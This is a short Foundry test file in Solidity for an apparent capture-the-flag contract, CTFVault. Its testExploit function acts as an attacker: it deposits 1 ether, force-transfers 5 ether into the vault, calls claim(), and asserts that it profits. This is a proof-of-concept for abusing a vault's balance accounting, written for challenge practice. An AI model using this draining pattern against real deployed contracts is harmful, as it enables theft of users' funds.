// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/CTFVault.sol";

contract CTFVaultTest is Test {
    CTFVault vault;

    address attacker = address(1);

    function setUp() public {
        vault = new CTFVault();

        vm.deal(attacker, 10 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        vault.deposit{value: 1 ether}();

        payable(address(vault)).transfer(5 ether);

        vault.claim();

        vm.stopPrank();

        assertGt(attacker.balance, 10 ether);
    }
}
